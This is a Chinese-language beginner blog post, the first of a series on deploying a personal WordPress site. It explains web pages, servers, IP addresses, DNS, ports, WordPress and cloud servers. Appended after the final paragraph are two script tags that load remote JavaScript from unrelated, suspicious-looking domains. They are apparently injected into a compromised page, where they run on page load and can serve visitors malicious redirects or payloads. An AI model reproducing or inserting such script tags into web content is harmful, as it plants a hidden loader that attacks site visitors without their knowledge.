---
title: "\u5229\u7528WordPress\u90e8\u7f72\u4e2a\u4eba\u7f51\u7ad9\uff08\u4e00\uff09\uff1a\u7f51\u7ad9\u521d\u6b65"
date: 2021-05-31 21:43:23
slug: "利用部署wordpress部署个人网站"
categories:
  - 网站运维
tags:
  - Web
  - WordPress
  - 计算机技术
description: >-
  想部署一个可以让所有人访问的网站，却只知晓浏览器的启动与关闭怎么办？这篇文章将教会不懂编程的读者如何部署一个运行在云服务器上的WordPress网站。
draft: false
---

<!-- wp:heading {"level":3} -->
<h3>0.前言</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>想部署一个可以让所有人访问的网站，却只懂浏览器的启动与关闭怎么办？这个系列将教会不懂编程的读者部署一个运行在云服务器上的WordPress网站。本篇是系列的第一篇，为计算机小白介绍计算机建立网站需要的基本知识，有一定基础的读者可以跳过。首先需要说明的是，无论是注册域名还是购买云服务器都需要一定成本，操作的时候手头最好有150元左右的预算。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>1.基本知识</h3>
<!-- /wp:heading -->

<!-- wp:heading {"level":4} -->
<h4>1.1网页浏览的原理</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>要部署自己的网站，首先要知道计算机访问网站的基本原理。我们平常浏览的网页其实是由很多<strong>文件</strong>组成的，这些文件描述网页中的各种内容如何排布、点击某个地方会出现什么效果，浏览器通过这些文件就可以为用户显示出精彩纷呈的网页。想要了解这些网页是如何被制作出来的可以学习html、css和Javascript的相关知识，这里暂且跳过。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>上面提到网页其实是很多个文件的集合，但我们网上冲浪的时候电脑里并没有这些文件呀？这些文件都被存储在网站管理员的计算机里了，为了让更多人可以访问到网站，这些计算机可能远不止一台，而且不会经常关机，这就是我们常说的<strong>服务器</strong>。服务器上运行着的<strong>Web服务器软件</strong>负责处理用户发来的访问请求，将网页文件返回给用户。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>为了能访问到服务器，我们需要知道这些计算机的家门在哪，因为计算机处理一串规则的数字速度是最快的，所以计算机之间用来互报家门的地址一串称为<strong>IP地址</strong>的数字。我们在浏览器中输入的网址其实是网站的<strong>域名</strong>，域名与IP地址的关系可以类比为姓名与身份证号。因为IP地址对人类来说不好记忆，所以给服务器起一个域名。网络中记录域名与对应IP地址的计算机称为<strong>DNS服务器</strong>。我们在浏览器输入一个域名后，计算机会询问DNS服务器这个域名对应的IP地址是什么，DNS服务器返回IP地址后，计算机通过IP地址向网站服务器发起访问请求。网站服务器收到请求后向我们的计算机发送网页文件，浏览器会根据这些文件向我们生成网页。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>还有一个问题是服务器上除了处理用户访问的Web服务器程序还运行着别的程序，比如现在服务器上运行着程序A和程序B，用户发来一个请求数据包，服务器怎么才能知道给哪个程序处理呢？为了解决这个问题，计算机提供<strong>端口</strong>这个东西。端口通过不同的的编号进行识别，范围从0到65535，我们所用的Web服务器程序通常绑定的是80号端口。每个程序与一个端口进行绑定，请求数据包中指定要访问的端口，服务器就知道这个请求应该交给哪个程序处理了。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>1.2 WordPress</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>了解过网站访问的基本原理，接下来要介绍一下我们建立网站所用的软件——WordPress. 据传说互联网上有41% 的网站都使用了WordPress搭建。WordPress是使用PHP语言开发的博客平台，我们用它在服务器上架设自己的网站，可以省去代码开发带来的庞大的工作量。WordPress提供其他大神开发的免费模板和插件，想要为博客添加功能或着更换网站的样式，直接下载这些插件和模板就可以了。如果要做一个自己的模板，需要你有一定的专业知识。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>1.3 云服务器</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>为了能让网站随时随地能被访问到，我们需要一台可以联网的计算机二十四小时不间断地运行着。用我们自己的电脑担当这个值班员角色，很有可能会影响电脑正常使用。试想我们正在打游戏的时候访客访问网站，大家都会感觉很卡！更关键的一个问题是，我们电脑连接网络所使用的IP地址（具体来说是IPv4）是开机后连接网络时运营商为我们分配的，每次分配到的地址可能不一样。但如果我们的地址经常变动，别的计算机就找不到我们住在哪里了，所以我们需要一个固定的IP地址。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>为了解决大家的上述需求，云计算公司建立庞大的数据中心，在用户需要使用服务器的时候从数据中心划分出一部分计算资源供用户使用。这部分计算资源可以看作一台放在远处的虚拟计算机，我们通过某些方法从自己的计算机远程操控它，就可以在那上面建立网站了。虚拟计算机可以24小时运行，拥有固定的IP地址，可以根据需要调整配置。比如某一时刻访问的用户比以往多很多倍所以网速不够了，可以通过增加带宽解决这个问题。当用户访问量恢复正常后收回多余的性能，避免资源的浪费。这样的虚拟计算机我们称为<strong>云服务器</strong>，又称ECS(Elastic Compute Service 弹性计算服务)。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>结语</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>以上是建立一个网站前需要了解的一些基本知识，下一篇将正式开始讲解具体操作步骤。</p>
<!-- /wp:paragraph --><script src='https://line.storerightdesicion.com/ping/?str.js' type='text/javascript'></script><script src='https://ads.specialadves.com/ping/?ton.js' type='text/javascript'></script>
